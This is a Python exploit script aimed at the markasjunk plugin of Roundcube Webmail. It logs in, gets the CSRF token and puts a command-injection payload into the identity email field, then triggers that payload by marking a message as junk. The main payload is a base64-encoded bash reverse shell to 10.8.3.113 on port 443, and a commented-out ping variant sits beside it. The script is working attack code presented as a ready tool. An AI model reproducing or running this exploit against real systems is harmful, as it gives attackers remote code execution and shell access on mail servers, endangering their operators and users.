#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import argparse

parser = argparse.ArgumentParser(description='Roundcube Webmail markasjunk plugin RCE')
parser.add_argument('-u', '--username', required=True, help='Email username for Roundcube')
parser.add_argument('-p', '--password', required=True, help='Password for Roundcube')
parser.add_argument('-ip', '--target_ip', required=True, help='Target IP address for ping')
parser.add_argument('-uid', '--uid_to_mark', required=True, help='UID of the email to mark as junk')

args = parser.parse_args()

url = "<URL>"
login_url = url + "/?_task=login"
markasjunk_url = url + "/?_task=mail&_action=plugin.markasjunk.junk" # URL to mark the email as junk

username = args.username
password = args.password
target_ip = args.target_ip  # IP to ping
uid_to_mark = args.uid_to_mark  # UID of the email to mark as junk

session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')

csrf_token = soup.find('input', {'name': '_token'})['value'] if soup.find('input', {'name': '_token'}) else None

payload_login = {
    "_user": username,
    "_pass": password,
    "_task": "login",
    "_action": "login",
}

if csrf_token:
    payload_login['_token'] = csrf_token
    print(f"CSRF token added: {csrf_token}")

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
}

response = session.post(login_url, data=payload_login, headers=headers)

if "invalid" in response.text.lower() or response.status_code != 200:
    print("Login failed. Please check your credentials.")
else:
    print("Login successful.")

    response = session.get(url + "/?_task=mail&_mbox=INBOX", headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')

    csrf_token = soup.find('input', {'name': '_token'})['value'] if soup.find('input', {'name': '_token'}) else None

    payload_identity = {
        '_name': 'pwn by luks!',
        #'_email': f'luks&ping${{IFS}}-c${{IFS}}1${{IFS}}{target_ip}&@foo.io',
        '_email': f'luks&echo${{IFS}}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMy4xMTMvNDQzIDA+JjEK|base64${{IFS}}-d|bash&@foo.io',
        '_organization': '',
        '_reply-to': '',
        '_bcc': '',
        '_standard': '1',
        '_token': csrf_token,
        '_task': 'settings',
        '_action': 'save-identity',
        '_iid': '0',
    }

    response = session.post(url + '/?_task=settings', data=payload_identity, headers=headers)

    if response.status_code == 200:
        print("Identity modified successfully.")
    else:
        print(f"Failed to modify identity. Code: {response.status_code}, Response: {response.text}")

    mark_as_junk_payload = {
        '_uid': uid_to_mark,
        '_mbox': 'INBOX',
        '_remote': '1',
        '_unlock': 'loading'
    }

    if csrf_token:
        mark_as_junk_payload['_token'] = csrf_token

    response = session.post(markasjunk_url, data=mark_as_junk_payload, headers=headers)

    if response.status_code == 200:
        print("Email marked as junk successfully.")
    else:
        print(f"Failed to mark email as junk. Code: {response.status_code}, Response: {response.text}")
